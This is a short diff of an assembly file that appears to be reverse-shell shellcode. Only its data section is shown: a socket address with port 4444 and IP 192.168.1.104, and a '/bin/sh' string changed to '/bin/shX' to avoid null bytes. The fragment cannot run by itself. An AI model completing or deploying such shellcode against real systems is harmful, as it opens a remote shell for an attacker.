@@ -40,4 +40,4 @@ struct:
 .ascii "\x11\x5c"
 .byte 192,168,1,104
 binsh:
-.ascii "/bin/sh"
+.ascii "/bin/shX"
